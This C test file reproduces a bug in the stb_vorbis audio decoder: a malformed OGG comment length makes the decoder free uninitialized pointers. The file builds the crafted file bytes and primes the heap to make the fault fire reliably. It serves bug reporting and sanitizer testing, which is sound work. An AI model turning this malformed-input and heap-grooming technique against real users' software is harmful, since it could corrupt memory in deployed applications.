/*
 * BUG-stb_vorbis-005: Use-After-Free / Free of Uninitialized Memory
 *
 * When start_decoder allocates f->comment_list (array of char* pointers)
 * via setup_malloc (plain malloc in non-preallocated path), the entries
 * past the loop's failure point are left uninitialized.  If comment k+1
 * fails to allocate, entries k+2..comment_list_length-1 contain whatever
 * garbage was in the malloc'd block.  vorbis_deinit then calls
 * setup_free(p, p->comment_list[i]) for ALL entries — freeing a wild
 * pointer.
 *
 * Trigger: comment_list_length=3, comment[0] succeeds, comment[1]'s
 * len=0x7FFFFFFE (INT_MAX-1) causes setup_malloc to fail via its
 * sz>INT_MAX-7 guard, leaving comment[2] uninitialized.
 *
 * Compile:
 *   cc -fsanitize=address,undefined -g -I. tests/bug_stb_vorbis_005.c \
 *      -o tests/bug_stb_vorbis_005 -lm
 *
 * Run:
 *   ASAN_OPTIONS=allocator_may_return_null=1 ./tests/bug_stb_vorbis_005
 */

#define STB_VORBIS_IMPLEMENTATION
#define STB_VORBIS_NO_STDIO
#include "stb_vorbis.c"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <malloc.h>

/* First-page bytes borrowed from reference poc (same OGG id header). */
unsigned char first_page[] = {
    0x4f, 0x67, 0x67, 0x53, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x01, 0x00, 0x78, 0x55, 0x5a, 0x12, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x01, 0x1e, 0x01, 0x76, 0x6f, 0x72, 0x62, 0x69, 0x73, 0x00,
    0x00, 0x00, 0x00, 0x01, 0x44, 0xac, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff,
    0x00, 0xf4, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0xb8, 0x01
};

static void w32(unsigned char *p, unsigned int v) {
    p[0] = (unsigned char)(v);
    p[1] = (unsigned char)(v >> 8);
    p[2] = (unsigned char)(v >> 16);
    p[3] = (unsigned char)(v >> 24);
}

int main() {
    /* M_PERTURB makes glibc set freed-memory to non-zero pattern,
       increasing the chance that recycled memory contains garbage
       that triggers an ASan / interposer detection on free(). */
    mallopt(M_PERTURB, 0xAA);

    /* ── Allocate a work buffer ─────────────────────────────────── */
    unsigned char work[4096];
    memset(work, 0, sizeof(work));
    int pos = 0;

    printf("BUG-stb_vorbis-005: uninitialized comment_list free after OOM\n");

    /* ==================== PAGE 0: Identification =================== */
    /* 28-byte OGG page header + 30-byte identification packet */
    int id_page_sz = 28 + 30;  /* bytes 0..57 of reference data */
    memcpy(work + pos, first_page, id_page_sz);
    pos += id_page_sz;

    /* ==================== PAGE 1: Comment + Setup ================== */
    int page1_start = pos;

    /* OGG page header (27 bytes) */
    memcpy(work + pos, "OggS", 4);   pos += 4;
    work[pos++] = 0;                   /* version */
    work[pos++] = 0;                   /* header_type */
    w32(work + pos, 0); pos += 4;     /* granule_position low */
    w32(work + pos, 0); pos += 4;     /* granule_position high */
    w32(work + pos, 0x12be5678); pos += 4; /* serial */
    w32(work + pos, 1);         pos += 4; /* page_seq */
    w32(work + pos, 0);         pos += 4; /* CRC (not verified) */
    int seg_count_pos = pos;
    pos++;                              /* placeholder for seg count */
    int seg_table_pos = pos;
    /* Reserve exactly 2 segment-table entries (comment + setup) */
    for (int i = 0; i < 2; i++) work[pos++] = 0;
    int data_start = pos;

    /* ── Comment packet ────────────────────────────────────────── */
    int comment_start = pos;
    work[pos++] = 3;                     /* packet_type = comment */
    memcpy(work + pos, "vorbis", 6);     pos += 6;
    w32(work + pos, 4); pos += 4;       /* vendor_len */
    memcpy(work + pos, "test", 4);      pos += 4;
    w32(work + pos, 3); pos += 4;       /* comment_list_length = 3 */
    w32(work + pos, 10); pos += 4;      /* comment[0].len = 10 */
    memcpy(work + pos, "0123456789", 10); pos += 10;
    w32(work + pos, 0x7FFFFFFE); pos += 4; /* comment[1].len = INT_MAX-1 → setup_malloc fails */
    /* We never read comment[2] or the framing bit — start_decoder
       returns error at the comment[1] malloc failure. */
    int comment_bytes = pos - comment_start;

    /* ── Setup (dummy, never consumed) ─────────────────────────── */
    int setup_start = pos;
    work[pos++] = 5;                     /* packet_type = setup */
    memcpy(work + pos, "vorbis", 6);     pos += 6;
    /* Just one bit of padding so the segment is non-empty */
    work[pos++] = 0;
    int setup_bytes = pos - setup_start;

    /* ── Fill segment table ────────────────────────────────────── */
    int nsegs = 2;  /* comment + setup, each < 255 bytes */
    work[seg_count_pos] = (unsigned char)nsegs;
    work[seg_table_pos + 0] = (unsigned char)comment_bytes;
    work[seg_table_pos + 1] = (unsigned char)setup_bytes;
    int page1_total = 27 + 1 + nsegs + comment_bytes + setup_bytes;
    pos = page1_start + page1_total;

    /* ==================== Open and trigger ========================= */
    printf("Total OGG data: %d bytes\n", pos);

    /* ── Prime the heap for deterministic non-zero reuse ────── */
    /* M_PERTURB makes glibc set freed-memory bytes to a pattern.
       We also allocate and free blocks of the same size the decoder
       will use for comment_list[] (24 bytes on 64-bit).  After this
       the free list contains chunks with non-zero data. */
    {
        void *prime[32];
        for (int i = 0; i < 32; i++)
            prime[i] = malloc(24);
        for (int i = 0; i < 32; i++)
            free(prime[i]);
    }

    /* Use malloc path (no pre-allocated buffer) so that setup_free
       actually calls free() on the uninitialized comment_list[2]. */
    int error;
    stb_vorbis *v = stb_vorbis_open_memory(work, (unsigned int)pos, &error, NULL);
    if (v) {
        printf("UNEXPECTED: decoder opened (no crash)\n");
        stb_vorbis_close(v);
    } else {
        printf("Decoder returned error %d (expected failure)\n", error);
    }

    printf("OK — no crash or sanitizer error from free-of-garbage\n");
    return 0;
}
